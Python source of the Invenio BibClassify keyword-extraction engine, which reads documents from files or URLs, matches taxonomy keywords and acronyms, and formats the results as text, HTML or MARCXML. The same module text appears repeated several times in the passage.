    First by the number of their spans (ie. how many times they were found),
    if it is equal it compares them by lenghts of their labels.
    """
    list_comparison = cmp(len(kw1[1][0]), len(kw0[1][0]))
    if list_comparison:
        return list_comparison

    if kw0[0].isComposite() and kw1[0].isComposite():
        component_avg0 = sum(kw0[1][1]) / len(kw0[1][1])
        component_avg1 = sum(kw1[1][1]) / len(kw1[1][1])
        component_comparison = cmp(component_avg1, component_avg0)
        if component_comparison:
            return component_comparison

    return cmp(len(str(kw1[0])), len(str(kw0[0])))


def _kw(keywords):
    """Turn list of keywords into dictionary."""
    r = {}
    for k, v in keywords:
        r[k] = v
    return r


def _sort_kw_matches(skw_matches, limit=0):
    """Return a resized version of keywords to the given length."""
    sorted_keywords = list(skw_matches.items())
    sorted_keywords.sort(_skw_matches_comparator)
    return limit and sorted_keywords[:limit] or sorted_keywords


def _get_partial_text(fulltext):
    """
    Return a short version of the fulltext used with the partial matching mode.

    The version is composed of 20% in the beginning and 20% in the middle of the
    text."""
    length = len(fulltext)

    get_index = lambda x: int(float(x) / 100 * length)

    partial_text = [fulltext[get_index(start):get_index(end)]
                    for start, end in bconfig.CFG_BIBCLASSIFY_PARTIAL_TEXT]

    return "\n".join(partial_text)


def save_keywords(filename, xml):
    tmp_dir = os.path.dirname(filename)
    if not os.path.isdir(tmp_dir):
        os.mkdir(tmp_dir)

    file_desc = open(filename, "w")
    file_desc.write(xml)
    file_desc.close()


def get_tmp_file(recid):
    tmp_directory = "%s/bibclassify" % bconfig.CFG_TMPDIR
    if not os.path.isdir(tmp_directory):
        os.mkdir(tmp_directory)
    filename = "bibclassify_%s.xml" % recid
    abs_path = os.path.join(tmp_directory, filename)
    return abs_path


def _parse_marc_code(field):
    """Parse marc field and return default indicators if not filled in."""
    field = str(field)
    if len(field) < 4:
        raise Exception('Wrong field code: %s' % field)
    else:
        field += '__'
    tag = field[0:3]
    ind1 = field[3].replace('_', '')
    ind2 = field[4].replace('_', '')
    return tag, ind1, ind2


if __name__ == "__main__":
    log.error("Please use bibclassify_cli from now on.")


# -*- coding: utf-8 -*-
#
# This file is part of Invenio.
# Copyright (C) 2007, 2008, 2009, 2010, 2011, 2013, 2014 CERN.
#
# Invenio is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 2 of the
# License, or (at your option) any later version.
#
# Invenio is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Invenio; if not, write to the Free Software Foundation, Inc.,
# 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.
"""
BibClassify engine.

This module is the main module of BibClassify. its two main methods are
output_keywords_for_sources and get_keywords_from_text. The first one output
keywords for a list of sources (local files or URLs, PDF or text) while the
second one outputs the keywords for text lines (which are obtained using the
module bibclassify_text_normalizer).

This module also takes care of the different outputs (text, MARCXML or HTML).
But unfortunately there is a confusion between running in a standalone mode
and producing output suitable for printing, and running in a web-based
mode where the webtemplate is used. For the moment the pieces of the representation
code are left in this module.
"""

from __future__ import print_function

import os
from six import iteritems
import config as bconfig

from invenio.legacy.bibclassify import ontology_reader as reader
import text_extractor as extractor
import text_normalizer as normalizer
import keyword_analyzer as keyworder
import acronym_analyzer as acronymer

from invenio.utils.url import make_user_agent_string                    
from invenio.utils.text import encode_for_xml

log = bconfig.get_logger("bibclassify.engine")

# ---------------------------------------------------------------------
#                          API
# ---------------------------------------------------------------------


def output_keywords_for_sources(input_sources, taxonomy_name, output_mode="text",
                                output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,
                                match_mode="full", no_cache=False, with_author_keywords=False,
                                rebuild_cache=False, only_core_tags=False, extract_acronyms=False,
                                api=False, **kwargs):
    """Output the keywords for each source in sources."""

    # Inner function which does the job and it would be too much work to
    # refactor the call (and it must be outside the loop, before it did
    # not process multiple files)
    def process_lines():
        if output_mode == "text":
            print("Input file: %s" % source)

        output = get_keywords_from_text(
            text_lines,
            taxonomy_name,
            output_mode=output_mode,
            output_limit=output_limit,
            spires=spires,
            match_mode=match_mode,
            no_cache=no_cache,
            with_author_keywords=with_author_keywords,
            rebuild_cache=rebuild_cache,
            only_core_tags=only_core_tags,
            extract_acronyms=extract_acronyms
        )
        if api:
            return output
        else:
            if isinstance(output, dict):
                for i in output:
                    print(output[i])

    # Get the fulltext for each source.
    for entry in input_sources:
        log.info("Trying to read input file %s." % entry)
        text_lines = None
        source = ""
        if os.path.isdir(entry):
            for filename in os.listdir(entry):
                if filename.startswith('.'):
                    continue
                filename = os.path.join(entry, filename)
                if os.path.isfile(filename):
                    text_lines = extractor.text_lines_from_local_file(filename)
                    if text_lines:
                        source = filename
                        process_lines()
        elif os.path.isfile(entry):
            text_lines = extractor.text_lines_from_local_file(entry)
            if text_lines:
                source = os.path.basename(entry)
                process_lines()
        else:
            # Treat as a URL.
            text_lines = extractor.text_lines_from_url(entry,                    
                                                       user_agent=make_user_agent_string("BibClassify"))                    
            if text_lines:
                source = entry.split("/")[-1]
                process_lines()


def get_keywords_from_local_file(local_file, taxonomy_name, output_mode="text",
                                 output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,
                                 match_mode="full", no_cache=False, with_author_keywords=False,
                                 rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,
                                 **kwargs):
    """Outputs keywords reading a local file. Arguments and output are the same                    
    as for :see: get_keywords_from_text() """                    

    log.info("Analyzing keywords for local file %s." % local_file)
    text_lines = extractor.text_lines_from_local_file(local_file)

    return get_keywords_from_text(text_lines,
                                  taxonomy_name,
                                  output_mode=output_mode,
                                  output_limit=output_limit,
                                  spires=spires,
                                  match_mode=match_mode,
                                  no_cache=no_cache,
                                  with_author_keywords=with_author_keywords,
                                  rebuild_cache=rebuild_cache,
                                  only_core_tags=only_core_tags,
                                  extract_acronyms=extract_acronyms)


def get_keywords_from_text(text_lines, taxonomy_name, output_mode="text",
                           output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER,
                           spires=False, match_mode="full", no_cache=False,
                           with_author_keywords=False, rebuild_cache=False,
                           only_core_tags=False, extract_acronyms=False,
                           **kwargs):
    """Extract keywords from the list of strings                    

    :param text_lines: list of strings (will be normalized before being
        joined into one string)
    :param taxonomy_name: string, name of the taxonomy_name
    :param output_mode: string - text|html|marcxml|raw
    :param output_limit: int
    :param spires: boolean, if True marcxml output reflect spires codes.
    :param match_mode: str - partial|full; in partial mode only
        beginning of the fulltext is searched.
    :param no_cache: boolean, means loaded definitions will not be saved.
    :param with_author_keywords: boolean, extract keywords from the pdfs.
    :param rebuild_cache: boolean
    :param only_core_tags: boolean
    :return: if output_mode=raw, it will return
        (single_keywords, composite_keywords, author_keywords, acronyms)
        for other output modes it returns formatted string
    """

    cache = reader.get_cache(taxonomy_name)
    if not cache:
        reader.set_cache(taxonomy_name,
                         reader.get_regular_expressions(taxonomy_name,
                                                        rebuild=rebuild_cache,
                                                        no_cache=no_cache))
        cache = reader.get_cache(taxonomy_name)
    _skw = cache[0]
    _ckw = cache[1]
    text_lines = normalizer.cut_references(text_lines)
    fulltext = normalizer.normalize_fulltext("\n".join(text_lines))

    if match_mode == "partial":
        fulltext = _get_partial_text(fulltext)
    author_keywords = None
    if with_author_keywords:
        author_keywords = extract_author_keywords(_skw, _ckw, fulltext)
    acronyms = {}
    if extract_acronyms:
        acronyms = extract_abbreviations(fulltext)

    single_keywords = extract_single_keywords(_skw, fulltext)
    composite_keywords = extract_composite_keywords(_ckw, fulltext, single_keywords)

    if only_core_tags:
        single_keywords = clean_before_output(_filter_core_keywors(single_keywords))
        composite_keywords = _filter_core_keywors(composite_keywords)
    else:
        # Filter out the "nonstandalone" keywords
        single_keywords = clean_before_output(single_keywords)
    return get_keywords_output(single_keywords, composite_keywords, taxonomy_name,
                               author_keywords, acronyms, output_mode, output_limit,
                               spires, only_core_tags)


def extract_single_keywords(skw_db, fulltext):
    """Find single keywords in the fulltext                    
    :var skw_db: list of KeywordToken objects
    :var fulltext: string, which will be searched
    :return : dictionary of matches in a format {
            <keyword object>, [[position, position...], ],
            ..
            }
            or empty {}
    """
    return keyworder.get_single_keywords(skw_db, fulltext) or {}


def extract_composite_keywords(ckw_db, fulltext, skw_spans):
    """Returns a list of composite keywords bound with the number of
    occurrences found in the text string.
    :var ckw_db: list of KewordToken objects (they are supposed to be composite ones)
    :var fulltext: string to search in
    :skw_spans: dictionary of already identified single keywords
    :return : dictionary of matches in a format {
            <keyword object>, [[position, position...], [info_about_matches] ],
            ..
            }
            or empty {}
    """
    return keyworder.get_composite_keywords(ckw_db, fulltext, skw_spans) or {}


def extract_abbreviations(fulltext):
    """Extract acronyms from the fulltext
    :var fulltext: utf-8 string
    :return: dictionary of matches in a formt {
          <keyword object>, [matched skw or ckw object, ....]
          }
          or empty {}
    """
    acronyms = {}
    K = reader.KeywordToken
    for k, v in acronymer.get_acronyms(fulltext).items():
        acronyms[K(k, type='acronym')] = v
    return acronyms


def extract_author_keywords(skw_db, ckw_db, fulltext):
    """Finds out human defined keyowrds in a text string. Searches for
    the string "Keywords:" and its declinations and matches the
    following words.

    :var skw_db: list single kw object
    :var ckw_db: list of composite kw objects
    :var fulltext: utf-8 string
    :return: dictionary of matches in a formt {
          <keyword object>, [matched skw or ckw object, ....]
          }
          or empty {}
    """
    akw = {}
    K = reader.KeywordToken
    for k, v in keyworder.get_author_keywords(skw_db, ckw_db, fulltext).items():
        akw[K(k, type='author-kw')] = v
    return akw


# ---------------------------------------------------------------------
#                          presentation functions
# ---------------------------------------------------------------------


def get_keywords_output(single_keywords, composite_keywords, taxonomy_name,
                        author_keywords=None, acronyms=None, style="text", output_limit=0,
                        spires=False, only_core_tags=False):
    """Returns a formatted string representing the keywords according
    to the chosen style. This is the main routing call, this function will
    also strip unwanted keywords before output and limits the number
    of returned keywords
    :var single_keywords: list of single keywords
    :var composite_keywords: list of composite keywords
    :var taxonomy_name: string, taxonomy name
    :keyword author_keywords: dictionary of author keywords extracted from fulltext
    :keyword acronyms: dictionary of extracted acronyms
    :keyword style: text|html|marc
    :keyword output_limit: int, number of maximum keywords printed (it applies
            to single and composite keywords separately)
    :keyword spires: boolen meaning spires output style
    :keyword only_core_tags: boolean
    """
    categories = {}
    # sort the keywords, but don't limit them (that will be done later)
    single_keywords_p = _sort_kw_matches(single_keywords)

    composite_keywords_p = _sort_kw_matches(composite_keywords)

    for w in single_keywords_p:
        categories[w[0].concept] = w[0].type
    for w in single_keywords_p:
        categories[w[0].concept] = w[0].type

    complete_output = _output_complete(single_keywords_p, composite_keywords_p,
                                       author_keywords, acronyms, spires,
                                       only_core_tags, limit=output_limit)
    functions = {"text": _output_text, "marcxml": _output_marc, "html":
                 _output_html, "dict": _output_dict}
    my_styles = {}

    for s in style:
        if s != "raw":
            my_styles[s] = functions[s](complete_output, categories)
        else:
            if output_limit > 0:
                my_styles["raw"] = (_kw(_sort_kw_matches(single_keywords, output_limit)),
                                    _kw(_sort_kw_matches(composite_keywords, output_limit)),
                                    author_keywords,  # this we don't limit (?)
                                    _kw(_sort_kw_matches(acronyms, output_limit)))
            else:
                my_styles["raw"] = (single_keywords_p, composite_keywords_p, author_keywords, acronyms)

    return my_styles


def build_marc(recid, single_keywords, composite_keywords,
               spires=False, author_keywords=None, acronyms=None):
    """Create xml record.

    :var recid: ingeter
    :var single_keywords: dictionary of kws
    :var composite_keywords: dictionary of kws
    :keyword spires: please don't use, left for historical
        reasons
    :keyword author_keywords: dictionary of extracted keywords
    :keyword acronyms: dictionary of extracted acronyms
    :return: str, marxml
    """
    output = ['<collection><record>\n'
              '<controlfield tag="001">%s</controlfield>' % recid]

    # no need to sort
    single_keywords = single_keywords.items()
    composite_keywords = composite_keywords.items()

    output.append(_output_marc(single_keywords, composite_keywords, author_keywords, acronyms))

    output.append('</record></collection>')

    return '\n'.join(output)


def _output_marc(output_complete, categories, kw_field=bconfig.CFG_MAIN_FIELD,
                 auth_field=bconfig.CFG_AUTH_FIELD, acro_field=bconfig.CFG_ACRON_FIELD,
                 provenience='BibClassify'):
    """Output the keywords in the MARCXML format.

    :var skw_matches: list of single keywords
    :var ckw_matches: list of composite keywords
    :var author_keywords: dictionary of extracted author keywords
    :var acronyms: dictionary of acronyms
    :var spires: boolean, True=generate spires output - BUT NOTE: it is
            here only not to break compatibility, in fact spires output
            should never be used for xml because if we read marc back
            into the KeywordToken objects, we would not find them
    :keyword provenience: string that identifies source (authority) that
        assigned the contents of the field
    :return: string, formatted MARC"""

    kw_template = ('<datafield tag="%s" ind1="%s" ind2="%s">\n'
                   '    <subfield code="2">%s</subfield>\n'
                   '    <subfield code="a">%s</subfield>\n'
                   '    <subfield code="n">%s</subfield>\n'
                   '    <subfield code="9">%s</subfield>\n'
                   '</datafield>\n')

    output = []

    tag, ind1, ind2 = _parse_marc_code(kw_field)
    for keywords in (output_complete["Single keywords"], output_complete["Core keywords"]):
        for kw in keywords:
            output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),
                                         encode_for_xml(kw), keywords[kw],
                                         encode_for_xml(categories[kw])))

    for field, keywords in ((auth_field, output_complete["Author keywords"]),
                            (acro_field, output_complete["Acronyms"])):
        if keywords and len(keywords) and field:  # field='' we shall not save the keywords
            tag, ind1, ind2 = _parse_marc_code(field)
            for kw, info in keywords.items():
                output.append(kw_template % (tag, ind1, ind2, encode_for_xml(provenience),
                                             encode_for_xml(kw), '', encode_for_xml(categories[kw])))

    return "".join(output)


def _output_complete(skw_matches=None, ckw_matches=None, author_keywords=None,
                     acronyms=None, spires=False, only_core_tags=False,
                     limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER):

    if limit:
        resized_skw = skw_matches[0:limit]
        resized_ckw = ckw_matches[0:limit]
    else:
        resized_skw = skw_matches
        resized_ckw = ckw_matches

    results = {"Core keywords": _get_core_keywords(skw_matches, ckw_matches, spires=spires)}

    if not only_core_tags:
        results["Author keywords"] = _get_author_keywords(author_keywords, spires=spires)
        results["Composite keywords"] = _get_compositekws(resized_ckw, spires=spires)
        results["Single keywords"] = _get_singlekws(resized_skw, spires=spires)
        results["Field codes"] = _get_fieldcodes(resized_skw, resized_ckw, spires=spires)
        results["Acronyms"] = _get_acronyms(acronyms)

    return results


def _output_dict(complete_output, categories):
    return {
        "complete_output": complete_output,
        "categories": categories
    }


def _output_text(complete_output, categories):
    """Output the results obtained in text format.


    :return: str, html formatted output
    """
    output = ""

    for result in complete_output:
        list_result = complete_output[result]
        if list_result:
            list_result_sorted = sorted(list_result, key=lambda x: list_result[x],
                                        reverse=True)
            output += "\n\n{0}:\n".format(result)
            for element in list_result_sorted:
                output += "\n{0} {1}".format(list_result[element], element)

    output += "\n--\n{0}".format(_signature())

    return output


def _output_html(complete_output, categories):
    """Output the same as txt output does, but HTML formatted.

    :var skw_matches: sorted list of single keywords
    :var ckw_matches: sorted list of composite keywords
    :var author_keywords: dictionary of extracted author keywords
    :var acronyms: dictionary of acronyms
    :var spires: boolean
    :var only_core_tags: boolean
    :keyword limit: int, number of printed keywords
    :return: str, html formatted output
    """
    return """<html>
    <head>
      <title>Automatically generated keywords by bibclassify</title>
    </head>
    <body>
    {0}
    </body>
    </html>""".format(
        _output_text(complete_output).replace('\n', '<br>')
    ).replace('\n', '')


def _get_singlekws(skw_matches, spires=False):
    """
    :var skw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: list of formatted keywords
    """
    output = {}
    for single_keyword, info in skw_matches:
        output[single_keyword.output(spires)] = len(info[0])
    return output


def _get_compositekws(ckw_matches, spires=False):
    """
    :var ckw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: list of formatted keywords
    """
    output = {}
    for composite_keyword, info in ckw_matches:
        output[composite_keyword.output(spires)] = {"numbers": len(info[0]),
                                                    "details": info[1]}
    return output


def _get_acronyms(acronyms):
    """Return a formatted list of acronyms."""
    acronyms_str = {}
    if acronyms:
        for acronym, expansions in iteritems(acronyms):
            expansions_str = ", ".join(["%s (%d)" % expansion
                                        for expansion in expansions])
            acronyms_str[acronym] = expansions_str

    return acronyms


def _get_author_keywords(author_keywords, spires=False):
    """Format the output for the author keywords.

    :return: list of formatted author keywors
    """
    out = {}
    if author_keywords:
        for keyword, matches in author_keywords.items():
            skw_matches = matches[0]  # dictionary of single keywords
            ckw_matches = matches[1]  # dict of composite keywords
            matches_str = []
            for ckw, spans in ckw_matches.items():
                matches_str.append(ckw.output(spires))
            for skw, spans in skw_matches.items():
                matches_str.append(skw.output(spires))
            if matches_str:
                out[keyword] = matches_str
            else:
                out[keyword] = 0

    return out


def _get_fieldcodes(skw_matches, ckw_matches, spires=False):
    """Return the output for the field codes.

    :var skw_matches: dict of {keyword: [info,...]}
    :var ckw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: string"""
    fieldcodes = {}
    output = {}

    for skw, _ in skw_matches:
        for fieldcode in skw.fieldcodes:
            fieldcodes.setdefault(fieldcode, set()).add(skw.output(spires))
    for ckw, _ in ckw_matches:

        if len(ckw.fieldcodes):
            for fieldcode in ckw.fieldcodes:
                fieldcodes.setdefault(fieldcode, set()).add(ckw.output(spires))
        else:  # inherit field-codes from the composites
            for kw in ckw.getComponents():
                for fieldcode in kw.fieldcodes:
                    fieldcodes.setdefault(fieldcode, set()).add('%s*' % ckw.output(spires))
                    fieldcodes.setdefault('*', set()).add(kw.output(spires))

    for fieldcode, keywords in fieldcodes.items():
        output[fieldcode] = ', '.join(keywords)

    return output


def _get_core_keywords(skw_matches, ckw_matches, spires=False):
    """Return the output for the field codes.

    :var skw_matches: dict of {keyword: [info,...]}
    :var ckw_matches: dict of {keyword: [info,...]}
    :keyword spires: bool, to get the spires output
    :return: set of formatted core keywords
    """
    output = {}
    category = {}

    def _get_value_kw(kw):
        """Help to sort the Core keywords."""
        i = 0
        while kw[i].isdigit():
            i += 1
        if i > 0:
            return int(kw[:i])
        else:
            return 0

    for skw, info in skw_matches:
        if skw.core:
            output[skw.output(spires)] = len(info[0])
            category[skw.output(spires)] = skw.type
    for ckw, info in ckw_matches:
        if ckw.core:
            output[ckw.output(spires)] = len(info[0])
        else:
            #test if one of the components is  not core
            i = 0
            for c in ckw.getComponents():
                if c.core:
                    output[c.output(spires)] = info[1][i]
                i += 1
    return output


def _filter_core_keywors(keywords):
    matches = {}
    for kw, info in keywords.items():
        if kw.core:
            matches[kw] = info
    return matches


def _signature():
    """Print out the bibclassify signature.

    #todo: add information about taxonomy, rdflib"""

    return 'bibclassify v%s' % (bconfig.VERSION,)


def clean_before_output(kw_matches):
    """Return a clean copy of the keywords data structure.

    Stripped off the standalone and other unwanted elements"""
    filtered_kw_matches = {}

    for kw_match, info in iteritems(kw_matches):
        if not kw_match.nostandalone:
            filtered_kw_matches[kw_match] = info

    return filtered_kw_matches

# ---------------------------------------------------------------------
#                          helper functions
# ---------------------------------------------------------------------


def _skw_matches_comparator(kw0, kw1):
    """
    Compare 2 single keywords objects.

    First by the number of their spans (ie. how many times they were found),
    if it is equal it compares them by lenghts of their labels.
    """
    list_comparison = cmp(len(kw1[1][0]), len(kw0[1][0]))
    if list_comparison:
        return list_comparison

    if kw0[0].isComposite() and kw1[0].isComposite():
        component_avg0 = sum(kw0[1][1]) / len(kw0[1][1])
        component_avg1 = sum(kw1[1][1]) / len(kw1[1][1])
        component_comparison = cmp(component_avg1, component_avg0)
        if component_comparison:
            return component_comparison

    return cmp(len(str(kw1[0])), len(str(kw0[0])))


def _kw(keywords):
    """Turn list of keywords into dictionary."""
    r = {}
    for k, v in keywords:
        r[k] = v
    return r


def _sort_kw_matches(skw_matches, limit=0):
    """Return a resized version of keywords to the given length."""
    sorted_keywords = list(skw_matches.items())
    sorted_keywords.sort(_skw_matches_comparator)
    return limit and sorted_keywords[:limit] or sorted_keywords


def _get_partial_text(fulltext):
    """
    Return a short version of the fulltext used with the partial matching mode.

    The version is composed of 20% in the beginning and 20% in the middle of the
    text."""
    length = len(fulltext)

    get_index = lambda x: int(float(x) / 100 * length)

    partial_text = [fulltext[get_index(start):get_index(end)]
                    for start, end in bconfig.CFG_BIBCLASSIFY_PARTIAL_TEXT]

    return "\n".join(partial_text)


def save_keywords(filename, xml):
    tmp_dir = os.path.dirname(filename)
    if not os.path.isdir(tmp_dir):
        os.mkdir(tmp_dir)

    file_desc = open(filename, "w")
    file_desc.write(xml)
    file_desc.close()


def get_tmp_file(recid):
    tmp_directory = "%s/bibclassify" % bconfig.CFG_TMPDIR
    if not os.path.isdir(tmp_directory):
        os.mkdir(tmp_directory)
    filename = "bibclassify_%s.xml" % recid
    abs_path = os.path.join(tmp_directory, filename)
    return abs_path


def _parse_marc_code(field):
    """Parse marc field and return default indicators if not filled in."""
    field = str(field)
    if len(field) < 4:
        raise Exception('Wrong field code: %s' % field)
    else:
        field += '__'
    tag = field[0:3]
    ind1 = field[3].replace('_', '')
    ind2 = field[4].replace('_', '')
    return tag, ind1, ind2


if __name__ == "__main__":
    log.error("Please use bibclassify_cli from now on.")


# -*- coding: utf-8 -*-
#
# This file is part of Invenio.
# Copyright (C) 2007, 2008, 2009, 2010, 2011, 2013, 2014 CERN.
#
# Invenio is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 2 of the
# License, or (at your option) any later version.
#
# Invenio is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Invenio; if not, write to the Free Software Foundation, Inc.,
# 59 Temple Place, Suite 330, Boston, MA 02111-1307, USA.
"""
BibClassify engine.

This module is the main module of BibClassify. its two main methods are
output_keywords_for_sources and get_keywords_from_text. The first one output
keywords for a list of sources (local files or URLs, PDF or text) while the
second one outputs the keywords for text lines (which are obtained using the
module bibclassify_text_normalizer).

This module also takes care of the different outputs (text, MARCXML or HTML).
But unfortunately there is a confusion between running in a standalone mode
and producing output suitable for printing, and running in a web-based
mode where the webtemplate is used. For the moment the pieces of the representation
code are left in this module.
"""

from __future__ import print_function

import os
from six import iteritems
import config as bconfig

from invenio.legacy.bibclassify import ontology_reader as reader
import text_extractor as extractor
import text_normalizer as normalizer
import keyword_analyzer as keyworder
import acronym_analyzer as acronymer

from invenio.utils.url import make_user_agent_string                    
from invenio.utils.text import encode_for_xml

log = bconfig.get_logger("bibclassify.engine")

# ---------------------------------------------------------------------
#                          API
# ---------------------------------------------------------------------


def output_keywords_for_sources(input_sources, taxonomy_name, output_mode="text",
                                output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,
                                match_mode="full", no_cache=False, with_author_keywords=False,
                                rebuild_cache=False, only_core_tags=False, extract_acronyms=False,
                                api=False, **kwargs):
    """Output the keywords for each source in sources."""

    # Inner function which does the job and it would be too much work to
    # refactor the call (and it must be outside the loop, before it did
    # not process multiple files)
    def process_lines():
        if output_mode == "text":
            print("Input file: %s" % source)

        output = get_keywords_from_text(
            text_lines,
            taxonomy_name,
            output_mode=output_mode,
            output_limit=output_limit,
            spires=spires,
            match_mode=match_mode,
            no_cache=no_cache,
            with_author_keywords=with_author_keywords,
            rebuild_cache=rebuild_cache,
            only_core_tags=only_core_tags,
            extract_acronyms=extract_acronyms
        )
        if api:
            return output
        else:
            if isinstance(output, dict):
                for i in output:
                    print(output[i])

    # Get the fulltext for each source.
    for entry in input_sources:
        log.info("Trying to read input file %s." % entry)
        text_lines = None
        source = ""
        if os.path.isdir(entry):
            for filename in os.listdir(entry):
                if filename.startswith('.'):
                    continue
                filename = os.path.join(entry, filename)
                if os.path.isfile(filename):
                    text_lines = extractor.text_lines_from_local_file(filename)
                    if text_lines:
                        source = filename
                        process_lines()
        elif os.path.isfile(entry):
            text_lines = extractor.text_lines_from_local_file(entry)
            if text_lines:
                source = os.path.basename(entry)
                process_lines()
        else:
            # Treat as a URL.
            text_lines = extractor.text_lines_from_url(entry,                    
                                                       user_agent=make_user_agent_string("BibClassify"))                    
            if text_lines:
                source = entry.split("/")[-1]
                process_lines()


def get_keywords_from_local_file(local_file, taxonomy_name, output_mode="text",
                                 output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER, spires=False,
                                 match_mode="full", no_cache=False, with_author_keywords=False,
                                 rebuild_cache=False, only_core_tags=False, extract_acronyms=False, api=False,
                                 **kwargs):
    """Outputs keywords reading a local file. Arguments and output are the same                    
    as for :see: get_keywords_from_text() """                    

    log.info("Analyzing keywords for local file %s." % local_file)
    text_lines = extractor.text_lines_from_local_file(local_file)

    return get_keywords_from_text(text_lines,
                                  taxonomy_name,
                                  output_mode=output_mode,
                                  output_limit=output_limit,
                                  spires=spires,
                                  match_mode=match_mode,
                                  no_cache=no_cache,
                                  with_author_keywords=with_author_keywords,
                                  rebuild_cache=rebuild_cache,
                                  only_core_tags=only_core_tags,
                                  extract_acronyms=extract_acronyms)


def get_keywords_from_text(text_lines, taxonomy_name, output_mode="text",
                           output_limit=bconfig.CFG_BIBCLASSIFY_DEFAULT_OUTPUT_NUMBER,
                           spires=False, match_mode="full", no_cache=False,
                           with_author_keywords=False, rebuild_cache=False,
                           only_core_tags=False, extract_acronyms=False,
                           **kwargs):
    """Extract keywords from the list of strings                    

    :param text_lines: list of strings (will be normalized before being
        joined into one string)
    :param taxonomy_name: string, name of the taxonomy_name
    :param output_mode: string - text|html|marcxml|raw
    :param output_limit: int
    :param spires: boolean, if True marcxml output reflect spires codes.
    :param match_mode: str - partial|full; in partial mode only
        beginning of the fulltext is searched.
    :param no_cache: boolean, means loaded definitions will not be saved.
    :param with_author_keywords: boolean, extract keywords from the pdfs.
    :param rebuild_cache: boolean
    :param only_core_tags: boolean
    :return: if output_mode=raw, it will return
        (single_keywords, composite_keywords, author_keywords, acronyms)
        for other output modes it returns formatted string
    """

    cache = reader.get_cache(taxonomy_name)
    if not cache:
        reader.set_cache(taxonomy_name,
                         reader.get_regular_expressions(taxonomy_name,
                                                        rebuild=rebuild_cache,
                                                        no_cache=no_cache))
        cache = reader.get_cache(taxonomy_name)
    _skw = cache[0]
    _ckw = cache[1]
    text_lines = normalizer.cut_references(text_lines)
    fulltext = normalizer.normalize_fulltext("\n".join(text_lines))

    if match_mode == "partial":
        fulltext = _get_partial_text(fulltext)
    author_keywords = None
    if with_author_keywords:
        author_keywords = extract_author_keywords(_skw, _ckw, fulltext)
    acronyms = {}
    if extract_acronyms:
        acronyms = extract_abbreviations(fulltext)

    single_keywords = extract_single_keywords(_skw, fulltext)
    composite_keywords = extract_composite_keywords(_ckw, fulltext, single_keywords)

    if only_core_tags:
        single_keywords = clean_before_output(_filter_core_keywors(single_keywords))
        composite_keywords = _filter_core_keywors(composite_keywords)
    else:
        # Filter out the "nonstandalone" keywords
        single_keywords = clean_before_output(single_keywords)
    return get_keywords_output(single_keywords, composite_keywords, taxonomy_name,
                               author_keywords, acronyms, output_mode, output_limit,
                               spires, only_core_tags)


def extract_single_keywords(skw_db, fulltext):
    """Find single keywords in the fulltext                    
    :var skw_db: list of KeywordToken objects
    :var fulltext: string, which will be searched
    :return : dictionary of matches in a format {
            <keyword object>, [[position, position...], ],
            ..
            }
            or empty {}
    """
    return keyworder.get_single_keywords(skw_db, fulltext) or {}


def extract_composite_keywords(ckw_db, fulltext, skw_spans):
    """Returns a list of composite keywords bound with the number of
    occurrences found in the text string.
    :var ckw_db: list of KewordToken objects (they are supposed to be composite ones)
    :var fulltext: string to search in
    :skw_spans: dictionary of already identified single keywords
    :return : dictionary of matches in a format {
            <keyword object>, [[position, position...], [info_about_matches] ],
            ..
            }
            or empty {}
    """
    return keyworder.get_composite_keywords(ckw_db, fulltext, skw_spans) or {}


def extract_abbreviations(fulltext):
    """Extract acronyms from the fulltext
    :var fulltext: utf-8 string
    :return: dictionary of matches in a formt {
          <keyword object>, [matched skw or ckw object, ....]
          }
          or empty {}
    """
    acronyms = {}
    K = reader.KeywordToken
    for k, v in acronymer.get_acronyms(fulltext).items():
        acronyms[K(k, type='acronym')] = v
    return acronyms


def extract_author_keywords(skw_db, ckw_db, fulltext):
    """Finds out human defined keyowrds in a text string. Searches for
    the string "Keywords:" and its declinations and matches the
    following words.

    :var skw_db: list single kw object
    :var ckw_db: list of composite kw objects
    :var fulltext: utf-8 string
    :return: dictionary of matches in a formt {
          <keyword object>, [matched skw or ckw object, ....]
          }
          or empty {}
    """
    akw = {}
    K = reader.KeywordToken
    for k, v in keyworder.get_author_keywords(skw_db, ckw_db, fulltext).items():
        akw[K(k, type='author-kw')] = v
    return akw


# ---------------------------------------------------------------------
#                          presentation functions
# ---------------------------------------------------------------------


def get_keywords_output(single_keywords, composite_keywords, taxonomy_name,
                        author_keywords=None, acronyms=None, style="text", output_limit=0,
                        spires=False, only_core_tags=False):
    """Returns a formatted string representing the keywords according
    to the chosen style. This is the main routing call, this function will
    also strip unwanted keywords before output and limits the number
    of returned keywords
    :var single_keywords: list of single keywords
    :var composite_keywords: list of composite keywords
    :var taxonomy_name: string, taxonomy name
    :keyword author_keywords: dictionary of author keywords extracted from fulltext
    :keyword acronyms: dictionary of extracted acronyms
    :keyword style: text|html|marc
    :keyword output_limit: int, number of maximum keywords printed (it applies
            to single and composite keywords separately)
    :keyword spires: boolen meaning spires output style
    :keyword only_core_tags: boolean
    """
    categories = {}
    # sort the keywords, but don't limit them (that will be done later)
    single_keywords_p = _sort_kw_matches(single_keywords)

